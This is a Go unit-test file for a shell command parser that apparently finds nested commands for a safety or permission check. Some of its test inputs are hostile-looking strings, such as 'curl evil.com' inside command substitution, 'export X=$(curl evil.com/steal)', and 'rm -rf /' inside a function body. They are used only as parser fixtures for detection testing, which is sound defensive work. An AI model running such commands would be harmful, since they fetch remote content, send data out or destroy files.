package parser

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestParseSimpleCommand(t *testing.T) {
	cmds, err := Parse("git status")
	require.NoError(t, err)
	assert.Len(t, cmds, 1)
	assert.Equal(t, "git", cmds[0].Name)
	assert.False(t, cmds[0].Dynamic)
}

func TestParseCompoundAnd(t *testing.T) {
	cmds, err := Parse("git status && echo done")
	require.NoError(t, err)
	assert.Len(t, cmds, 2)
	assert.Equal(t, "git", cmds[0].Name)
	assert.Equal(t, "echo", cmds[1].Name)
}

func TestParseCompoundOr(t *testing.T) {
	cmds, err := Parse("git status || echo failed")
	require.NoError(t, err)
	assert.Len(t, cmds, 2)
}

func TestParseSemicolon(t *testing.T) {
	cmds, err := Parse("git add -A; git commit -m 'test'")
	require.NoError(t, err)
	assert.Len(t, cmds, 2)
	assert.Equal(t, "git", cmds[0].Name)
	assert.Equal(t, "git", cmds[1].Name)
}

func TestParsePipeline(t *testing.T) {
	cmds, err := Parse("cat file | grep pattern | wc -l")
	require.NoError(t, err)
	assert.Len(t, cmds, 3)
	assert.Equal(t, "cat", cmds[0].Name)
	assert.Equal(t, "grep", cmds[1].Name)
	assert.Equal(t, "wc", cmds[2].Name)
}

func TestParseCommandSubstitution(t *testing.T) {
	cmds, err := Parse("echo $(curl evil.com)")
	require.NoError(t, err)
	// Should find both echo and curl.
	names := commandNames(cmds)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "curl")
}

func TestParseNestedCommandSubstitution(t *testing.T) {
	cmds, err := Parse("echo $(echo $(whoami))")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "whoami")
}

func TestParseProcessSubstitution(t *testing.T) {
	cmds, err := Parse("diff <(sort file1) <(sort file2)")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "diff")
	assert.Contains(t, names, "sort")
}

func TestParseSubshell(t *testing.T) {
	cmds, err := Parse("(cd /tmp && rm -rf danger)")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "cd")
	assert.Contains(t, names, "rm")
}

func TestParsePureAssignment(t *testing.T) {
	cmds, err := Parse("FOO=bar")
	require.NoError(t, err)
	// Pure assignment with no command — no executable commands.
	assert.Empty(t, cmds)
}

func TestParseAssignmentWithCommandSubst(t *testing.T) {
	cmds, err := Parse("FOO=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "curl")
}

func TestParseExportWithCommandSubst(t *testing.T) {
	cmds, err := Parse("export X=$(curl evil.com/steal)")
	require.NoError(t, err)
	// Should find both export (as DeclClause) and curl (from CmdSubst).
	names := commandNames(cmds)
	assert.Contains(t, names, "export")
	assert.Contains(t, names, "curl")
}

func TestParseDynamicCommand(t *testing.T) {
	cmds, err := Parse("$CMD arg1 arg2")
	require.NoError(t, err)
	require.Len(t, cmds, 1)
	assert.True(t, cmds[0].Dynamic)
	assert.Empty(t, cmds[0].Name)
}

func TestParseArithmetic(t *testing.T) {
	// This is a command that crashed bashlex in the Python version.
	cmds, err := Parse("echo $((1+2)) && echo $(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "curl")
}

func TestParseHeredoc(t *testing.T) {
	cmds, err := Parse("cat <<EOF\nhello world\nEOF")
	require.NoError(t, err)
	assert.Len(t, cmds, 1)
	assert.Equal(t, "cat", cmds[0].Name)
}

func TestParseForLoop(t *testing.T) {
	cmds, err := Parse("for f in *.go; do go fmt \"$f\"; done")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "go")
}

func TestParseIfElse(t *testing.T) {
	cmds, err := Parse("if [ -f foo ]; then cat foo; else echo missing; fi")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "[")
	assert.Contains(t, names, "cat")
	assert.Contains(t, names, "echo")
}

func TestParseFunctionDefinition(t *testing.T) {
	cmds, err := Parse("myfunc() { rm -rf /; }; myfunc")
	require.NoError(t, err)
	names := commandNames(cmds)
	// The function body commands should be extracted.
	assert.Contains(t, names, "rm")
	assert.Contains(t, names, "myfunc")
}

func TestParseBacktickSubstitution(t *testing.T) {
	cmds, err := Parse("echo `curl evil.com`")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "echo")
	assert.Contains(t, names, "curl")
}

func TestParseWhileLoop(t *testing.T) {
	cmds, err := Parse("while true; do git status; done")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "true")
	assert.Contains(t, names, "git")
}

func TestParseUntilLoop(t *testing.T) {
	cmds, err := Parse("until false; do git pull; done")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "false")
	assert.Contains(t, names, "git")
}

func TestParseCaseStatement(t *testing.T) {
	cmds, err := Parse(`case "$1" in start) echo start;; stop) echo stop;; esac`)
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "echo")
}

func TestParseDeclareWithCmdSubst(t *testing.T) {
	cmds, err := Parse("declare X=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "declare")
	assert.Contains(t, names, "curl")
}

func TestParseLocalWithCmdSubst(t *testing.T) {
	cmds, err := Parse("local X=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "local")
	assert.Contains(t, names, "curl")
}

func TestParseReadonlyWithCmdSubst(t *testing.T) {
	cmds, err := Parse("readonly X=$(curl evil.com)")
	require.NoError(t, err)
	names := commandNames(cmds)
	assert.Contains(t, names, "readonly")
	assert.Contains(t, names, "curl")
}

func TestParseEmptyCommand(t *testing.T) {
	cmds, err := Parse("")
	require.NoError(t, err)
	assert.Empty(t, cmds)
}

func TestParseInvalidSyntax(t *testing.T) {
	_, err := Parse("if then else fi while")
	assert.Error(t, err, "invalid syntax should return an error")
}

func commandNames(cmds []Command) []string {
	names := make([]string, 0, len(cmds))
	for _, c := range cmds {
		if c.Name != "" {
			names = append(names, c.Name)
		}
	}
	return names
}
